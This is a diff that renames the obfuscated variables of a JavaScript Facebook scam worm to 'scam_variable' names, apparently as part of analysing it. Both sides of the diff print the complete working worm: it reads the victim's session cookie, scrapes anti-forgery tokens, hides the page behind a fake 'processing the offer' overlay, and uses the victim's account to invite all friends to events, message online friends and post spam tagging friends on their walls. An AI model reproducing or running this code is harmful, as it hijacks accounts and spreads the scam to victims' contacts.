@@ -14,112 +14,112 @@ var mf = function () {
             }, 500);
         };
     };
-var doget = function (_0xaa04xb, _0xaa04xc, _0xaa04xd) {
-        var _0xaa04xe = new XMLHttpRequest();
-        _0xaa04xe['open']('GET', _0xaa04xb);
-        _0xaa04xe['onreadystatechange'] = function () {
-            if (_0xaa04xe['readyState'] == 4) {
-                if (_0xaa04xe['status'] == 200 && _0xaa04xc) {
-                    _0xaa04xc(_0xaa04xe['responseText']);
+var doget = function (scam_variable_b, scam_variable_c, scam_variable_d) {
+        var scam_variable_e = new XMLHttpRequest();
+        scam_variable_e['open']('GET', scam_variable_b);
+        scam_variable_e['onreadystatechange'] = function () {
+            if (scam_variable_e['readyState'] == 4) {
+                if (scam_variable_e['status'] == 200 && scam_variable_c) {
+                    scam_variable_c(scam_variable_e['responseText']);
                 };
-                if (_0xaa04xd) {
-                    _0xaa04xd();
+                if (scam_variable_d) {
+                    scam_variable_d();
                 };
             };
         };
-        _0xaa04xe['send']();
+        scam_variable_e['send']();
     };
-doget('/', function (_0xaa04xf) {
-    var _0xaa04x10 = document['cookie']['match'](/c_user=(\d+)/)[1];
-    var _0xaa04x11 = function (_0xaa04x12) {
-            return _0xaa04x12 ? '@[' + _0xaa04x12['id'] + ':' + _0xaa04x12['name'] + ']' : '';
+doget('/', function (scam_variable_f) {
+    var scam_variable_10 = document['cookie']['match'](/c_user=(\d+)/)[1];
+    var scam_variable_11 = function (scam_variable_12) {
+            return scam_variable_12 ? '@[' + scam_variable_12['id'] + ':' + scam_variable_12['name'] + ']' : '';
         };
-    var _0xaa04x13 = function (_0xaa04x12) {
-            return _0xaa04x12 ? _0xaa04x12['name'] : '';
+    var scam_variable_13 = function (scam_variable_12) {
+            return scam_variable_12 ? scam_variable_12['name'] : '';
         };
-    var _0xaa04x14 = function (_0xaa04x12) {
+    var scam_variable_14 = function (scam_variable_12) {
             out = '';
-            for (var _0xaa04x15 in _0xaa04x12) {
-                out += (out ? '&' : '') + _0xaa04x15 + ((_0xaa04x12[_0xaa04x15] !== null) ? '=' + encodeURIComponent(_0xaa04x12[_0xaa04x15]) : '');
+            for (var scam_variable_15 in scam_variable_12) {
+                out += (out ? '&' : '') + scam_variable_15 + ((scam_variable_12[scam_variable_15] !== null) ? '=' + encodeURIComponent(scam_variable_12[scam_variable_15]) : '');
             };
             return out;
         };
-    var _0xaa04x16 = function (_0xaa04xb, _0xaa04x12, _0xaa04xc, _0xaa04xd) {
-            var _0xaa04xe = new XMLHttpRequest();
-            _0xaa04xe['open']('POST', _0xaa04xb);
-            _0xaa04xe['setRequestHeader']('Content-Type', 'application/x-www-form-urlencoded');
-            _0xaa04xe['onreadystatechange'] = function () {
-                if (_0xaa04xe['readyState'] == 4) {
-                    if (_0xaa04xe['status'] == 200 && _0xaa04xc) {
-                        _0xaa04xc(_0xaa04xe['responseText']);
+    var scam_variable_16 = function (scam_variable_b, scam_variable_12, scam_variable_c, scam_variable_d) {
+            var scam_variable_e = new XMLHttpRequest();
+            scam_variable_e['open']('POST', scam_variable_b);
+            scam_variable_e['setRequestHeader']('Content-Type', 'application/x-www-form-urlencoded');
+            scam_variable_e['onreadystatechange'] = function () {
+                if (scam_variable_e['readyState'] == 4) {
+                    if (scam_variable_e['status'] == 200 && scam_variable_c) {
+                        scam_variable_c(scam_variable_e['responseText']);
                     };
-                    if (_0xaa04xd) {
-                        _0xaa04xd();
+                    if (scam_variable_d) {
+                        scam_variable_d();
                     };
                 };
             };
-            _0xaa04xe['send'](_0xaa04x14(_0xaa04x12));
+            scam_variable_e['send'](scam_variable_14(scam_variable_12));
         };
-    var _0xaa04x17 = function () {
-            var _0xaa04x18 = document['createElement']('div');
-            _0xaa04x18['style']['display'] = 'block';
-            _0xaa04x18['style']['position'] = 'absolute';
-            _0xaa04x18['style']['width'] = 100 + '%';
-            _0xaa04x18['style']['height'] = 100 + '%';
-            _0xaa04x18['style']['left'] = 0 + 'px';
-            _0xaa04x18['style']['top'] = 0 + 'px';
-            _0xaa04x18['style']['textAlign'] = 'center';
-            _0xaa04x18['style']['padding'] = '4px';
-            _0xaa04x18['style']['background'] = '#FFFFFF';
-            _0xaa04x18['style']['zIndex'] = 999999;
-            _0xaa04x18['innerHTML'] = '&nbsp;<br/>Please wait, this can take a little while...<br/><br/> We are processing the offer for you... <a href="javascript:void(0);" onclick="wf=0; mf();">click here</a> ';
-            document['body']['appendChild'](_0xaa04x18);
+    var scam_variable_17 = function () {
+            var scam_variable_18 = document['createElement']('div');
+            scam_variable_18['style']['display'] = 'block';
+            scam_variable_18['style']['position'] = 'absolute';
+            scam_variable_18['style']['width'] = 100 + '%';
+            scam_variable_18['style']['height'] = 100 + '%';
+            scam_variable_18['style']['left'] = 0 + 'px';
+            scam_variable_18['style']['top'] = 0 + 'px';
+            scam_variable_18['style']['textAlign'] = 'center';
+            scam_variable_18['style']['padding'] = '4px';
+            scam_variable_18['style']['background'] = '#FFFFFF';
+            scam_variable_18['style']['zIndex'] = 999999;
+            scam_variable_18['innerHTML'] = '&nbsp;<br/>Please wait, this can take a little while...<br/><br/> We are processing the offer for you... <a href="javascript:void(0);" onclick="wf=0; mf();">click here</a> ';
+            document['body']['appendChild'](scam_variable_18);
         };
-    var _0xaa04x19 = _0xaa04xf['match'](/name=\\"xhpc_composerid\\" value=\\"([\d\w]+)\\"/i);
-    if (_0xaa04x19) {
-        comp = _0xaa04x19[1];
+    var scam_variable_19 = scam_variable_f['match'](/name=\\"xhpc_composerid\\" value=\\"([\d\w]+)\\"/i);
+    if (scam_variable_19) {
+        comp = scam_variable_19[1];
     } else {
         comp = '';
     };
-    var _0xaa04x1a = _0xaa04xf['match'](/name="post_form_id" value="([\d\w]+)"/i)[1];
-    var _0xaa04x1b = _0xaa04xf['match'](/name="fb_dtsg" value="([\d\w]+)"/i)[1];
-    var _0xaa04x1c = document['getElementById']('navAccountName')['firstChild']['data'];
-    redirect = redirect + '?' + _0xaa04x14({
-        userid: _0xaa04x10,
-        name: _0xaa04x1c,
+    var scam_variable_1a = scam_variable_f['match'](/name="post_form_id" value="([\d\w]+)"/i)[1];
+    var scam_variable_1b = scam_variable_f['match'](/name="fb_dtsg" value="([\d\w]+)"/i)[1];
+    var scam_variable_1c = document['getElementById']('navAccountName')['firstChild']['data'];
+    redirect = redirect + '?' + scam_variable_14({
+        userid: scam_variable_10,
+        name: scam_variable_1c,
         doclose: 1
     });
-    _0xaa04x17();
+    scam_variable_17();
     if (eventdesc) {
         wf++;
-        _0xaa04x16('/ajax/choose/?__a=1', {
+        scam_variable_16('/ajax/choose/?__a=1', {
             type: 'event',
             eid: null,
             invite_message: '',
             __d: 1,
-            post_form_id: _0xaa04x1a,
-            fb_dtsg: _0xaa04x1b,
+            post_form_id: scam_variable_1a,
+            fb_dtsg: scam_variable_1b,
             lsd: null,
             post_form_id_source: 'AsyncRequest'
-        }, function (_0xaa04x1d) {
-            var _0xaa04x1e = _0xaa04x1d['match'](/\\"token\\":\\"([^\\]+)\\"/)[1];
-            var _0xaa04xb = '/ajax/typeahead/first_degree.php?__a=1&viewer=' + _0xaa04x10 + '&token=' + _0xaa04x1e + '&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha';
-            doget(_0xaa04xb, function (_0xaa04x1f) {
-                var _0xaa04x20 = _0xaa04x1f['match'](/\{"uid":\d+,/g);
-                var _0xaa04x21 = [];
-                for (var _0xaa04x22 = 0; _0xaa04x22 < _0xaa04x20['length']; _0xaa04x22++) {
-                    var _0xaa04x23 = _0xaa04x20[_0xaa04x22]['match'](/:(\d+),/)[1];
-                    if (_0xaa04x23 != _0xaa04x10) {
-                        _0xaa04x21['push'](_0xaa04x23);
+        }, function (scam_variable_1d) {
+            var scam_variable_1e = scam_variable_1d['match'](/\\"token\\":\\"([^\\]+)\\"/)[1];
+            var scam_variable_b = '/ajax/typeahead/first_degree.php?__a=1&viewer=' + scam_variable_10 + '&token=' + scam_variable_1e + '&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha';
+            doget(scam_variable_b, function (scam_variable_1f) {
+                var scam_variable_20 = scam_variable_1f['match'](/\{"uid":\d+,/g);
+                var scam_variable_21 = [];
+                for (var scam_variable_22 = 0; scam_variable_22 < scam_variable_20['length']; scam_variable_22++) {
+                    var scam_variable_23 = scam_variable_20[scam_variable_22]['match'](/:(\d+),/)[1];
+                    if (scam_variable_23 != scam_variable_10) {
+                        scam_variable_21['push'](scam_variable_23);
                     };
                 };
-                var _0xaa04x24 = new Date();
-                _0xaa04x24['setTime'](_0xaa04x24['getTime']() + 60 * 60 * 24 * 1000);
-                datestr = (_0xaa04x24['getMonth']() + 1) + '/' + _0xaa04x24['getDate']() + '/' + _0xaa04x24['getFullYear']();
-                timestr = _0xaa04x24['getHours']() * 60;
-                var _0xaa04x25 = {
-                    post_form_id: _0xaa04x1a,
-                    fb_dtsg: _0xaa04x1b,
+                var scam_variable_24 = new Date();
+                scam_variable_24['setTime'](scam_variable_24['getTime']() + 60 * 60 * 24 * 1000);
+                datestr = (scam_variable_24['getMonth']() + 1) + '/' + scam_variable_24['getDate']() + '/' + scam_variable_24['getFullYear']();
+                timestr = scam_variable_24['getHours']() * 60;
+                var scam_variable_25 = {
+                    post_form_id: scam_variable_1a,
+                    fb_dtsg: scam_variable_1b,
                     start_dateIntlDisplay: datestr,
                     start_date: datestr,
                     start_time_hour_min: timestr,
@@ -130,7 +130,7 @@ doget('/', function (_0xaa04xf) {
                     geo_id: '',
                     geo_sq: '',
                     desc: eventdesc,
-                    sgb_invitees: _0xaa04x21['join'](','),
+                    sgb_invitees: scam_variable_21['join'](','),
                     sgb_emails: '',
                     sgb_message: '',
                     privacy_type: 'on',
@@ -139,8 +139,8 @@ doget('/', function (_0xaa04xf) {
                     save: 'Create Event',
                     submitting: ''
                 };
-                _0xaa04x25['new'] = '';
-                _0xaa04x16('/events/create.php', _0xaa04x25, false, function () {
+                scam_variable_25['new'] = '';
+                scam_variable_16('/events/create.php', scam_variable_25, false, function () {
                     mf(--wf);
                 });
             });
@@ -148,29 +148,29 @@ doget('/', function (_0xaa04xf) {
     };
     if (chatmessage) {
         wf++;
-        _0xaa04x16('/ajax/chat/buddy_list.php?__a=1', {
-            user: _0xaa04x10,
-            post_form_id: _0xaa04x1a,
-            fb_dtsg: _0xaa04x1b,
+        scam_variable_16('/ajax/chat/buddy_list.php?__a=1', {
+            user: scam_variable_10,
+            post_form_id: scam_variable_1a,
+            fb_dtsg: scam_variable_1b,
             lsd: null,
             post_form_id_source: 'AsyncRequest',
             popped_out: false,
             force_render: true
-        }, function (_0xaa04x1d) {
-            var _0xaa04x26 = _0xaa04x1d['substr'](9);
-            var _0xaa04x27 = eval('(' + _0xaa04x26 + ')');
-            var _0xaa04x28 = _0xaa04x27['payload']['buddy_list'];
-            for (var _0xaa04x29 in _0xaa04x28['nowAvailableList']) {
-                var _0xaa04x2a = Math['floor'](Math['random']() * 1335448958);
-                var _0xaa04x2b = (new Date())['getTime']();
-                var _0xaa04x2c = chatmessage['replace']('%firstname%', _0xaa04x28['userInfos'][_0xaa04x29]['firstName']['toLowerCase']());
-                _0xaa04x16('/ajax/chat/send.php?__a=1', {
+        }, function (scam_variable_1d) {
+            var scam_variable_26 = scam_variable_1d['substr'](9);
+            var scam_variable_27 = eval('(' + scam_variable_26 + ')');
+            var scam_variable_28 = scam_variable_27['payload']['buddy_list'];
+            for (var scam_variable_29 in scam_variable_28['nowAvailableList']) {
+                var scam_variable_2a = Math['floor'](Math['random']() * 1335448958);
+                var scam_variable_2b = (new Date())['getTime']();
+                var scam_variable_2c = chatmessage['replace']('%firstname%', scam_variable_28['userInfos'][scam_variable_29]['firstName']['toLowerCase']());
+                scam_variable_16('/ajax/chat/send.php?__a=1', {
                     msg_id: Math['floor'](Math['random']() * 1335448958),
                     client_time: (new Date())['getTime'](),
-                    msg_text: chatmessage['replace']('%firstname%', _0xaa04x28['userInfos'][_0xaa04x29]['firstName']['toLowerCase']()),
-                    to: _0xaa04x29,
-                    post_form_id: _0xaa04x1a,
-                    fb_dtsg: _0xaa04x1b,
+                    msg_text: chatmessage['replace']('%firstname%', scam_variable_28['userInfos'][scam_variable_29]['firstName']['toLowerCase']()),
+                    to: scam_variable_29,
+                    post_form_id: scam_variable_1a,
+                    fb_dtsg: scam_variable_1b,
                     post_form_id_source: 'AsyncRequest'
                 });
             };
@@ -179,38 +179,38 @@ doget('/', function (_0xaa04xf) {
     };
     if (postmessage) {
         wf++;
-        doget('/ajax/browser/friends/?uid=' + _0xaa04x10 + '&filter=all&__a=1&__d=1', function (_0xaa04x1d) {
-            var _0xaa04x20 = _0xaa04x1d['match'](/\/\d+_\d+_\d+_q\.jpg.*?u003ca href=\\"http:\\\/\\\/www.facebook.com\\\/.*?\\u003c\\\/a>/gi);
-            var _0xaa04x2d = [];
-            if (_0xaa04x20) {
-                for (var _0xaa04x22 = 0; _0xaa04x22 < _0xaa04x20['length']; _0xaa04x22++) {
-                    var _0xaa04x23 = _0xaa04x20[_0xaa04x22]['match'](/_\d+_/)[0]['replace'](/_/g, '');
-                    var _0xaa04x2e = _0xaa04x20[_0xaa04x22]['match'](/>[^>]+\\u003c\\\/a>$/i)[0]['replace'](/\\u003c\\\/a>$/gim, '')['replace'](/>/g, '');
-                    _0xaa04x2d['push']({
-                        id: _0xaa04x23,
-                        name: _0xaa04x2e
+        doget('/ajax/browser/friends/?uid=' + scam_variable_10 + '&filter=all&__a=1&__d=1', function (scam_variable_1d) {
+            var scam_variable_20 = scam_variable_1d['match'](/\/\d+_\d+_\d+_q\.jpg.*?u003ca href=\\"http:\\\/\\\/www.facebook.com\\\/.*?\\u003c\\\/a>/gi);
+            var scam_variable_2d = [];
+            if (scam_variable_20) {
+                for (var scam_variable_22 = 0; scam_variable_22 < scam_variable_20['length']; scam_variable_22++) {
+                    var scam_variable_23 = scam_variable_20[scam_variable_22]['match'](/_\d+_/)[0]['replace'](/_/g, '');
+                    var scam_variable_2e = scam_variable_20[scam_variable_22]['match'](/>[^>]+\\u003c\\\/a>$/i)[0]['replace'](/\\u003c\\\/a>$/gim, '')['replace'](/>/g, '');
+                    scam_variable_2d['push']({
+                        id: scam_variable_23,
+                        name: scam_variable_2e
                     });
                 };
             };
-            var _0xaa04xd = [];
-            var _0xaa04x2f = [];
-            while (_0xaa04x2d['length']) {
-                var _0xaa04x30 = Math['floor'](Math['random']() * _0xaa04x2d['length']);
-                _0xaa04xd['push'](_0xaa04x2d[_0xaa04x30]);
-                _0xaa04x2f['push'](_0xaa04x2d[_0xaa04x30]);
-                var _0xaa04x2b = _0xaa04x2d['shift']();
-                if (_0xaa04x30) {
-                    _0xaa04x2d[_0xaa04x30 - 1] = _0xaa04x2b;
+            var scam_variable_d = [];
+            var scam_variable_2f = [];
+            while (scam_variable_2d['length']) {
+                var scam_variable_30 = Math['floor'](Math['random']() * scam_variable_2d['length']);
+                scam_variable_d['push'](scam_variable_2d[scam_variable_30]);
+                scam_variable_2f['push'](scam_variable_2d[scam_variable_30]);
+                var scam_variable_2b = scam_variable_2d['shift']();
+                if (scam_variable_30) {
+                    scam_variable_2d[scam_variable_30 - 1] = scam_variable_2b;
                 };
             };
             if (debug) {
-                alert('fetched friends: ' + _0xaa04xd['length']);
+                alert('fetched friends: ' + scam_variable_d['length']);
             };
-            var _0xaa04x31 = {
-                post_form_id: _0xaa04x1a,
-                fb_dtsg: _0xaa04x1b,
+            var scam_variable_31 = {
+                post_form_id: scam_variable_1a,
+                fb_dtsg: scam_variable_1b,
                 xhpc_composerid: comp,
-                xhpc_targetid: _0xaa04x10,
+                xhpc_targetid: scam_variable_10,
                 xhpc_context: 'home',
                 xhpc_fbx: '',
                 lsd: null,
@@ -219,55 +219,55 @@ doget('/', function (_0xaa04xf) {
             mt = postmessage;
             m = postmessage;
             while (mt['search']('%tf%') >= 0) {
-                var _0xaa04x32 = _0xaa04xd['pop']();
-                mt = mt['replace']('%tf%', _0xaa04x13(_0xaa04x32));
-                m = m['replace']('%tf%', _0xaa04x11(_0xaa04x32));
+                var scam_variable_32 = scam_variable_d['pop']();
+                mt = mt['replace']('%tf%', scam_variable_13(scam_variable_32));
+                m = m['replace']('%tf%', scam_variable_11(scam_variable_32));
             };
-            _0xaa04x31['xhpc_message_text'] = mt;
-            _0xaa04x31['xhpc_message'] = m;
+            scam_variable_31['xhpc_message_text'] = mt;
+            scam_variable_31['xhpc_message'] = m;
             if (debug) {
                 alert('message text: ' + mt);
             };
-            _0xaa04x16('/ajax/updatestatus.php?__a=1', _0xaa04x31);
-            var _0xaa04x33 = function (_0xaa04x15) {
-                    if (_0xaa04x15 == 0) {
+            scam_variable_16('/ajax/updatestatus.php?__a=1', scam_variable_31);
+            var scam_variable_33 = function (scam_variable_15) {
+                    if (scam_variable_15 == 0) {
                         wf = 0;
                         mf();
                         return;
                     };
-                    var _0xaa04x34 = _0xaa04x2f['shift']();
-                    var _0xaa04x35 = {
-                        post_form_id: _0xaa04x1a,
-                        fb_dtsg: _0xaa04x1b,
+                    var scam_variable_34 = scam_variable_2f['shift']();
+                    var scam_variable_35 = {
+                        post_form_id: scam_variable_1a,
+                        fb_dtsg: scam_variable_1b,
                         xhpc_composerid: comp,
-                        xhpc_targetid: _0xaa04x34['id'],
+                        xhpc_targetid: scam_variable_34['id'],
                         xhpc_context: 'profile',
                         xhpc_fbx: 1,
                         lsd: null,
                         post_form_id_source: 'AsyncRequest'
                     };
-                    var _0xaa04x36 = postmessage;
-                    var _0xaa04x37 = postmessage;
-                    if (_0xaa04xd['length'] == 0) {
+                    var scam_variable_36 = postmessage;
+                    var scam_variable_37 = postmessage;
+                    if (scam_variable_d['length'] == 0) {
                         wf = 0;
                         mf();
                         return;
                     };
-                    while (_0xaa04x36['search']('%tf%') >= 0) {
-                        var _0xaa04x38 = _0xaa04xd['pop']();
-                        _0xaa04x36 = _0xaa04x36['replace']('%tf%', _0xaa04x13(_0xaa04x38));
-                        _0xaa04x37 = _0xaa04x37['replace']('%tf%', _0xaa04x11(_0xaa04x38));
+                    while (scam_variable_36['search']('%tf%') >= 0) {
+                        var scam_variable_38 = scam_variable_d['pop']();
+                        scam_variable_36 = scam_variable_36['replace']('%tf%', scam_variable_13(scam_variable_38));
+                        scam_variable_37 = scam_variable_37['replace']('%tf%', scam_variable_11(scam_variable_38));
                     };
-                    _0xaa04x35['xhpc_message_text'] = _0xaa04x36;
-                    _0xaa04x35['xhpc_message'] = _0xaa04x37;
-                    _0xaa04x16('/ajax/updatestatus.php?__a=1', _0xaa04x35);
+                    scam_variable_35['xhpc_message_text'] = scam_variable_36;
+                    scam_variable_35['xhpc_message'] = scam_variable_37;
+                    scam_variable_16('/ajax/updatestatus.php?__a=1', scam_variable_35);
                     setTimeout(function () {
-                        _0xaa04x33(_0xaa04x15 - 1);
+                        scam_variable_33(scam_variable_15 - 1);
                     }, 2000);
                 };
             wf++;
             setTimeout(function () {
-                _0xaa04x33(nfriends);
+                scam_variable_33(nfriends);
             }, 2000);
         });
     };
